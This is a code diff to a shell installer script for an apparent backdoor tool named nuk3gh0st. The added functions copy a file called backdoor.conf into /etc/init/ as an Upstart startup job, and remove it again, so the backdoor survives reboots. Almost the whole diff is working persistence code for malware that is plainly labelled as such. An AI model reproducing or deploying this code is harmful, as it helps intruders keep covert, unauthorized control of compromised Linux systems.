@@ -178,14 +178,20 @@ function create_rc_symlinks {
 	echo ""
 }
 
+function create_upstart_service {
+	echo -e "${item} Coping backdoor.conf to /etc/init/ (Upstart startup script directory)"
+	echo -e "   ${purple} cmd: cp /usr/share/nuk3gh0st/backdoor.conf /etc/init/backdoor.conf${endColor}"
+	cp /usr/share/nuk3gh0st/backdoor.conf /etc/init/backdoor.conf
+	echo ""
+}
+
 function enable_startup_service {
 	echo -e "${item} Detecting init system..."
 	echo -n -e "${cyan}"
 	if [[ `/sbin/init --version` =~ upstart ]]; then 
 		echo -n -e "${endColor}"
 		echo -e "${item} Init system is upstart"
-		create_init_service
-		update_rc_symlinks
+		create_upstart_service
 	elif [[ `systemctl` =~ -\.mount ]]; then
 		echo -n -e "${endColor}"
 		echo -e "${item} Init system is systemd"
@@ -269,14 +275,20 @@ function remove_init_service {
 	echo ""
 }
 
+function remove_upstart_service {
+	echo -e "${item} Removing backdoor.conf from /etc/init/ (Upstart startup script directory)"
+	echo -e "   ${purple} cmd: rm /etc/init/backdoor.conf${endColor}"
+	rm /etc/init/backdoor.conf
+	echo ""
+}
+
 function disable_startup_service {
 	echo -e "${item} Detecting init system..."
 	echo -n -e "${cyan}"
 	if [[ `/sbin/init --version` =~ upstart ]]; then
 		echo -n -e "${endColor}"
 		echo -e "${item} Init system is upstart"
-		remove_rc_symlinks
-		remove_init_service
+		remove_upstart_service
 	elif [[ `systemctl` =~ -\.mount ]]; then
 		echo -n -e "${endColor}"
 		echo -e "${item} Init system is systemd"
